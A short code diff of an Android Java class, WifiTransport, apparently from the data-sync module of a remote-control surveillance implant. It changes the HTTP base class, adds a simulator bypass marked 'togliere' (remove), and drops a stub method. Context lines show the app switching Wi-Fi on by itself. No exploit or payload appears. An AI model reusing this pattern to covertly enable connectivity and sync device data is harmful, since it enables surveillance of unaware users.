@@ -11,13 +11,13 @@ package com.ht.RCSAndroidGUI.action.sync;
 import android.content.Context;
 import android.net.wifi.WifiManager;
 
+import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Status;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class WifiTransport.
  */
-public class WifiTransport extends HttpTransport {
+public class WifiTransport extends HttpKeepAliveTransport {
 
 	/** The forced. */
 	private boolean forced;
@@ -62,19 +62,15 @@ public class WifiTransport extends HttpTransport {
 				available = wifi.setWifiEnabled(true);
 			}
 		}
+		
+		// TODO: togliere
+		if(Device.self().isSimulator()){
+			return true;
+		}
 
 		return available;
 	}
 
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#getSuffix()
-	 */
-	@Override
-	protected String getSuffix() {
-		// TODO
-		return "";
-	}
+
 
 }
